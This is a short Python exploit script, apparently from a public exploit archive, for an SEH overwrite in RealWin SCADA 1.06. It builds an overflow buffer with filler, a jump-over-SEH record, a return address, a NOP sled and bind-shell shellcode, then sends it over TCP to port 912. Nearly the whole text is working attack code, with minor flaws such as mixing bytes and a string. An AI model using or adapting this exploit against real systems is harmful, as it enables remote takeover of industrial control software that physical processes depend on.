# Exploit Title: RealWin SCADA System SEH Overwrite
# Date: 10-27-10
# Author: Blake
# Software Link: http://www.realflex.com/products/realwin/realwin.php
# Version: 1.06
# Tested on: Windows XP SP3 running in VMware Workstation (rfx)

import socket, sys

from time import sleep
from base64 import b64encode
from payload import buf
import socket

def shell_attack(target_machine, target_port):
 
    host = target_machine
    port = target_port   # port 912 by default

    # windows/shell_bind_tcp - 368 bytes Encoder: x86/shikata_ga_nai
    # LPORT=4444, 
    

    head = b"\x64\x12\x54\x6A\x20\x00\x00\x00\xF4\x1F\x00\x00"
    junk = b"\x41" * 228
    next_seh = b"\xeb\x06\x90\x90"	# overwrites next seh
    seh = b"\xea\xe3\x02\x40" 		# seh overwritten at 232 bytes - 4002e3ea
    nops = b"\x90" * 20				# nop sled
    junk2 = b"\x42" * (7972 - len(buf)) # 1740 bytes for shellcode

  
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host,port))
    except:
       
        pass
    
    
    s.send(head + junk + next_seh + seh + nops + buf + junk2 + "\r\n")
    s.close()
   
   